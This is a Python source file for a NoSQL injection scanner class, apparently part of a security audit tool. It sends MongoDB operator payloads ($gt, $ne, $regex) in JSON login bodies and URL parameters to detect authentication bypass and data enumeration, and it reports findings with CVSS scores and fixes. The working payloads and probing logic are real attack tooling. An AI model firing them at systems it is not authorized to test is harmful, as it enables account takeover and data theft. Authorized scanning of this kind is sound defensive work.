import os
import json
import requests
from urllib.parse import urljoin, urlparse, quote
from colorama import Fore, Style, init

init(autoreset=True)


class NoSQLAgent:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0 '
                '(Authorized Assessment)'
            )
        })
        self.findings = []

    def test_nosql_in_json(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing NoSQL "
            f"injection (JSON)...{Style.RESET_ALL}"
        )
        nosql_payloads = [
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": "admin", "password": {"$gt": ""}},
        ]

        headers = {
            'Content-Type': 'application/json'
        }

        success_indicators = [
            'token', 'session', 'welcome',
            'dashboard', 'success', 'logged',
            'authenticated', 'access_token',
            'auth_token', 'jwt', 'bearer'
        ]

        for payload in nosql_payloads:
            try:
                r = self.session.post(
                    url,
                    json=payload,
                    headers=headers,
                    timeout=10
                )
                resp_lower = r.text.lower()
                if (
                    r.status_code == 200
                    and any(
                        s in resp_lower
                        for s in success_indicators
                    )
                ):
                    self.findings.append({
                        'type': 'NoSQL Injection (JSON)',
                        'category': 'nosql_injection',
                        'risk': 'CRITICAL',
                        'url': url,
                        'payload': str(payload),
                        'description': (
                            'NoSQL injection via JSON body. '
                            'MongoDB operator accepted.'
                        ),
                        'business_impact': (
                            'Authentication bypass possible. '
                            'All user accounts accessible.'
                        ),
                        'fix': (
                            '1. Validate input types strictly\n'
                            '2. Use mongoose schema validation\n'
                            '3. Reject operator keys ($gt, $ne)\n'
                            '4. Use parameterized queries'
                        ),
                        'cvss_score': 9.8,
                        'cwe': 'CWE-943'
                    })
                    print(
                        f"  {Fore.RED}"
                        f"[!!!] NoSQL INJECTION!"
                        f"{Style.RESET_ALL}"
                    )
                    break
            except Exception:
                pass

        return self.findings

    def test_nosql_in_params(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing NoSQL "
            f"injection (params)...{Style.RESET_ALL}"
        )
        param_payloads = [
            "[$ne]=1",
            "[$gt]=0",
            "[$regex]=.*",
        ]

        parsed = urlparse(url)
        if not parsed.query:
            return self.findings

        params = {}
        for p in parsed.query.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                params[k] = v

        for param in list(params.keys())[:3]:
            for payload_suffix in param_payloads:
                test_url = (
                    url.split('?')[0]
                    + f"?{param}{payload_suffix}"
                )
                try:
                    r = self.session.get(
                        test_url, timeout=10
                    )
                    if (
                        r.status_code == 200
                        and len(r.content) > 100
                    ):
                        try:
                            data = r.json()
                            if data and (
                                isinstance(data, list)
                                and len(data) > 0
                            ):
                                self.findings.append({
                                    'type': (
                                        'NoSQL Injection (Params)'
                                    ),
                                    'category': (
                                        'nosql_injection'
                                    ),
                                    'risk': 'HIGH',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload_suffix,
                                    'description': (
                                        'NoSQL operator in URL '
                                        'param returned data'
                                    ),
                                    'business_impact': (
                                        'Data enumeration possible. '
                                        'Filter bypass.'
                                    ),
                                    'fix': (
                                        '1. Validate param types\n'
                                        '2. Reject operator objects\n'
                                        '3. Use strict schemas'
                                    ),
                                    'cvss_score': 7.5,
                                    'cwe': 'CWE-943'
                                })
                                print(
                                    f"  {Fore.RED}"
                                    f"[!!!] NoSQL PARAM INJECTION"
                                    f"{Style.RESET_ALL}"
                                )
                                break
                        except Exception:
                            pass
                except Exception:
                    pass

        return self.findings

    def run_full_scan(self, urls_to_test=None):
        print(
            f"\n{Fore.YELLOW}[NOSQL AGENT] "
            f"Starting...{Style.RESET_ALL}"
        )
        test_urls = urls_to_test or [self.target]
        for url in test_urls:
            self.test_nosql_in_json(url)
            self.test_nosql_in_params(url)
        print(
            f"{Fore.GREEN}[NOSQL AGENT] Complete - "
            f"{len(self.findings)} findings"
            f"{Style.RESET_ALL}"
        )
        return self.findings
